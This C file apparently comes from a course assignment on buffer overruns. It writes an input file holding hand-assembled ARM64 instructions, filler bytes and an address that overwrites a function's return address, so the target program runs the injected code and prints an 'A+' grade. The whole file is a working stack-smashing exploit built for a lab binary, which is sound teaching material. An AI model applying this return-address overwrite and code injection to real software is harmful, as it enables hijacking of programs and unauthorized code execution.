/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Ishaan Javali and Jack Zhang                               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


/* 
main does not receive any parameters or input from stdin or 
other streams. It does not write to stdout. It uses fprintf 
to write 56 bytes to a file called dataAplus and returns 0.
 */
int main() {
    FILE *psFile;
    unsigned int movInstr, movAddr, movAInstr;
    unsigned int blInstr;
    unsigned int movBranchInstr, movReadStringCallAddr;
    unsigned int branchMachineCode;
    unsigned int strInstr1, strInstr2;
    unsigned int strOffset1, strOffset2, strOffset3, strOffset4;
    unsigned int strbInstr, adrInstr, bInstr;
    psFile = fopen("dataAplus", "w");
    
    /* 4 bytes */
    fprintf(psFile, "I&J");
    fprintf(psFile, "%c", '\0'); 

    movAInstr = MiniAssembler_mov(1, 'A');

    /* bl printf("%c", grade)  */
    blInstr = MiniAssembler_bl(0x400600, 0x420060);

    movInstr = MiniAssembler_mov(0, '+');
    adrInstr = MiniAssembler_adr(1, 0x420044, 0x420068);
    strbInstr = MiniAssembler_strb(0, 1);
    bInstr = MiniAssembler_b(0x400864, 0x420070);

    /* Write machine code instructions to input file */
    fwrite(&movAInstr, sizeof(unsigned int), 1, psFile);
    /* fwrite(&movAInstr, sizeof(unsigned int), 1, psFile); */
    fwrite(&blInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&movInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&adrInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&strbInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&bInstr, sizeof(unsigned int), 1, psFile);
    
    /* 20 filler bytes */
    fprintf(psFile, "12345678123456781234");

    /* We want to replace getName's return address
     with 0x42005C (address in BSS section where 
     machine code instructions begin*/
    fprintf(psFile, "%c", 0x5C);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x42);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);

    /* Close the file */
    fclose(psFile);
    return 0;
}